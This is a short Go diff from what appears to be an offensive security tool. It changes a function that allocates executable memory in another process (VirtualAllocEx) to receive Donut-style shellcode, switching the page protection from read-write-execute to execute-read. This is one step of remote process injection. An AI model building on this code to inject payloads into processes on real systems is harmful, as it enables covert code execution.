@@ -13,8 +13,7 @@ import (
 // Runner runner
 func Runner(donut []byte, handle syscall.Handle) (bool, string) {
 
-	//TODO: Change to RX
-	address, err := VirtualAllocEx(handle, 0, uintptr(len(donut)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	address, err := VirtualAllocEx(handle, 0, uintptr(len(donut)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READ)
 	if util.CheckErrorMessage(err) {
 		return false, execute.ERROR_PID
 	}
